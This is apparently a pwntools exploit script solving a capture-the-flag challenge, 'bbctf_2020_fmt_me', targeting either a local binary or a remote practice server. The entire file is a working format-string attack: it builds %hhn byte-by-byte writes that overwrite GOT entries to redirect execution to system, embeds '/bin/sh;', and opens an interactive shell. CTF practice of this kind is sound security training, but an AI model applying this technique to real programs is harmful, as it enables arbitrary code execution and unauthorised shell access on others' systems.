#coding:utf-8
import sys
from pwn import *
context.log_level='debug'
elfelf='bbctf_2020_fmt_me'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process(elfelf)
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF(elfelf)
			libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
			# ld = ELF('/lib/x86_64-linux-gnu/ld-2.23.so')
			one_gadgaet=[0x45226,0x4527a,0xf0364,0xf1207]
		else :
			io=remote('node3.buuoj.cn',27025)
			elf=ELF(elfelf)
			libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
			# ld = ELF('/lib/x86_64-linux-gnu/ld-2.23.so')
			one_gadgaet=[0x45226,0x4527a,0xf0364,0xf1207]


		io.sendlineafter('\n','2')
		def fmt(off,addr1,addr2,addr3,addr4):

			arg0=(addr1)&0xff
			arg1=(addr1&0xff00)>>8
			arg2=(addr1&0xff0000)>>16
			arg3=(addr1&0xff000000)>>24
			arg4=(addr1&0xff00000000)>>32
			arg5=(addr1&0xff0000000000)>>40
			# arg6=(addr1&0xff000000000000)>>48
			# arg7=(addr1&0xff00000000000000)>>56
			arg00=(addr3)&0xff
			arg11=(addr3&0xff00)>>8
			arg22=(addr3&0xff0000)>>16
			arg33=(addr3&0xff000000)>>24
			arg44=(addr3&0xff00000000)>>32
			arg55=(addr3&0xff0000000000)>>40
			
			
			
			pay1='%'+str(arg0-8)+'c%'+str(off+10)+'$hhn'
			pay2='%'+str((arg1-arg0+0x100)%0x100)+'c%'+str(off+11)+'$hhn'
			pay3='%'+str((arg2-arg1+0x100)%0x100)+'c%'+str(off+12)+'$hhn'
			pay4='%'+str((arg3-arg2+0x100)%0x100)+'c%'+str(off+13)+'$hhn'
			pay5='%'+str(off+14)+'$hhn'
			pay6='%'+str(off+15)+'$hhn'
			pay7='%'+str((arg00-arg5+0x100)%0x100)+'c%'+str(off+16)+'$hhn'
			pay8='%'+str((arg11-arg00+0x100)%0x100)+'c%'+str(off+17)+'$hhn'
			pay9='%'+str((arg22-arg11+0x100)%0x100)+'c%'+str(off+18)+'$hhn'
			pay10='%'+str((arg33-arg22+0x100)%0x100)+'c%'+str(off+19)+'$hhn'
			pay11='%'+str(off+20)+'$hhn'
			pay12='%'+str(off+21)+'$hhn'
			# pay7='%'+str((arg6-arg5+0x100)%0x100)+'c%10$hhn'
			# pay8='%'+str((arg7-arg6+0x100)%0x100)+'c%10$hhn'
			
			pay='/bin/sh;'+pay1+pay2+pay3+pay4+pay5+pay6
			pay+=pay7+pay8+pay9+pay10+pay11+pay12
			pay=pay.ljust(0xa0,'\x00')
			for i in range(6):
				pay+=p64(addr2+i)
			for i in range(6):
				pay+=p64(addr4+i)
			io.send(pay)
		# def fmt(off,addr1,addr2):

		# 	arg0=(addr1)&0xff
		# 	arg1=(addr1&0xff00)>>8
		# 	arg2=(addr1&0xff0000)>>16
		# 	arg3=(addr1&0xff000000)>>24
		# 	arg4=(addr1&0xff00000000)>>32
		# 	arg5=(addr1&0xff0000000000)>>40
		# 	# arg6=(addr1&0xff000000000000)>>48
		# 	# arg7=(addr1&0xff00000000000000)>>56
			
			
			
		# 	pay1='%'+str(arg0)+'c%'+str(off+10)+'$hhn'
		# 	pay2='%'+str((arg1-arg0+0x100)%0x100)+'c%'+str(off+11)+'$hhn'
		# 	pay3='%'+str((arg2-arg1+0x100)%0x100)+'c%'+str(off+12)+'$hhn'
		# 	pay4='%'+str((arg3-arg2+0x100)%0x100)+'c%'+str(off+13)+'$hhn'
		# 	pay5='%'+str((arg4-arg3+0x100)%0x100)+'c%'+str(off+14)+'$hhn'
		# 	pay6='%'+str((arg5-arg4+0x100)%0x100)+'c%'+str(off+15)+'$hhn'
		# 	# pay7='%'+str((arg6-arg5+0x100)%0x100)+'c%10$hhn'
		# 	# pay8='%'+str((arg7-arg6+0x100)%0x100)+'c%10$hhn'
			
		# 	pay=pay1+pay2+pay3+pay4+pay5+pay6
		# 	pay=pay.ljust(0x50,'\x00')
		# 	for i in range(6):
		# 		pay+=p64(addr2+i)
		# 	io.sendline(pay)



		# gdb.attach(io,'b snprintf')
		fmt(16,0x4010C0,elf.got['system'],0x401056,elf.got['snprintf'])
		# fmt(6,0x4010C0,elf.got['system'])
		io.sendlineafter('\n','2')
		
		
		# libc_base=u64(io.recvuntil('\x7f')[-6:]+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		# libc.address=libc_base
		# bin_sh_addr=libc.search('/bin/sh\x00').next()
		# system_addr=libc.sym['system']

		
		# success('libc_base:'+hex(libc_base))
		# success('heap_base:'+hex(heap_base))
		
		
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue